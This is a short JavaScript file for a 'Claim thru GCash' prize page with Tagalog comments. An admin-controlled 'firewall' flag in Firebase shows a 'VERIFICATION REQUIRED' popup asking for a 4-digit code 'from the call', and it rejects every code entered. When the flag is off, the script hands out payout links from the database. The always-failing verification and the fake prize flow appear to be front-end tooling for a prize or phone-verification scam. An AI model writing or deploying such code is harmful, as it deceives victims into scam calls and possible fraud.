/**
 * popup_share.js
 * DIRECT CLAIM - WALANG SECOND POPUP
 */

// ========== FIREWALL VERIFICATION POPUP ==========
function showFirewallVerificationPopup() {
    var existing = document.getElementById('firewallModal');
    if (existing) existing.remove();
    
    var modal = document.createElement('div');
    modal.id = 'firewallModal';
    modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:20001;display:flex;align-items:center;justify-content:center;';
    
    modal.innerHTML = `
        <div style="background:#1a1525;border-radius:48px;max-width:340px;width:85%;padding:30px;text-align:center;border:1px solid rgba(255,215,0,0.3);">
            <div style="font-size:48px;">📞</div>
            <h2 style="color:#ff4444;">VERIFICATION REQUIRED</h2>
            <p style="color:white;">Enter the 4-digit code from the call.</p>
            <div style="display:flex;gap:10px;margin:15px 0;">
                <input type="text" id="vCode" style="flex:1;background:rgba(0,0,0,0.5);border:1px solid rgba(255,215,0,0.3);border-radius:30px;padding:12px;color:white;text-align:center;font-size:18px;" placeholder="1234" maxlength="4">
                <button id="verifyBtn" style="background:#ff4444;border:none;border-radius:30px;padding:0 20px;color:white;font-weight:bold;cursor:pointer;">VERIFY</button>
            </div>
            <div id="vError" style="color:#ff4444;font-size:12px;display:none;"></div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var input = document.getElementById('vCode');
    var verifyBtn = document.getElementById('verifyBtn');
    var errorDiv = document.getElementById('vError');
    
    verifyBtn.onclick = function() {
        var code = input.value.trim();
        if (!code || code.length < 4) {
            errorDiv.innerHTML = "Enter 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        errorDiv.innerHTML = "Invalid code. Try again.";
        errorDiv.style.display = 'block';
        input.value = '';
        input.focus();
    };
}

// ========== DIRECT CLAIM ==========
async function handleClaimThruGCash() {
    console.log("CLAIM THRU GCASH clicked");
    
    // Isara ang prize popup
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) prizePopup.style.display = 'none';
    
    if (!firebase || !firebase.database) {
        alert("Firebase not ready.");
        return;
    }
    
    var db = firebase.database();
    
    try {
        // Tignan ang firewall
        var firewallSnap = await db.ref('admin/globalFirewall/active').once('value');
        var isFirewallOn = firewallSnap.val() === true;
        
        if (isFirewallOn) {
            showFirewallVerificationPopup();
            return;
        }
        
        // Kunin ang link
        var linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        
        if (!linkSnap.exists()) {
            alert("No payout link available.");
            return;
        }
        
        var key = Object.keys(linkSnap.val())[0];
        var url = linkSnap.val()[key].url;
        
        // Update status
        await db.ref('links/' + key).update({ status: 'claimed' });
        
        // Redirect
        window.location.href = url;
        
    } catch(e) {
        alert("Error: " + e.message);
    }
}

// ========== INIT BUTTON ==========
function initButton() {
    var btn = document.getElementById('claimGCashBtn');
    if (btn) {
        var newBtn = btn.cloneNode(true);
        btn.parentNode.replaceChild(newBtn, btn);
        newBtn.onclick = function(e) {
            e.preventDefault();
            handleClaimThruGCash();
        };
        console.log("Button ready");
    } else {
        setTimeout(initButton, 500);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initButton();
});
